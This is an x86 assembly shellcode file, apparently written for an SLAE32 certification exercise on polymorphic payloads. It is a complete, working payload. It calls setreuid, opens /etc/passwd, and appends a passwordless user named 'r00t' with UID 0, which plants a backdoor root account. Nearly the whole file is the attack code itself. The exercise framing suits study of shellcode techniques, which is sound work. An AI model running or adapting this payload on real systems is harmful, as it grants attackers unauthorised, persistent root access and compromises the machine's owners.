; adduser_polymorphic.nasm - 45 bytes
; Author: Jack McBride (PA-6483)
; Website:  https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
;
; Assignment 6: Polymorphism

global _start

section .text

_start:
	jmp _cmd
	
_main:
	pop edx;	store string to be added to /etc/passwd
	push byte 0x46
	pop eax
	int 0x80;	call setreuid
	mov al, 0x5
	push ecx
	push 0x64777373
	push 0x61702f2f
	push 0x6374652f
	mov ebx, esp
	inc ecx
	mov ch, 0x4
	int 0x80;	call open on /etc/passwd with 401 flags
	xor ecx, ecx
	push ecx
	xchg ecx, edx
	xchg ebx, eax
	xor eax, eax
	mov al, 0x4
	mov edx, 0x1A
	int 0x80;	call write to append new user to /etc/passwd
	xchg eax, esi
	int 0x80
	
_cmd:
	call _main
	db "r00t::0:0::/root:/bin/bash", 0xA
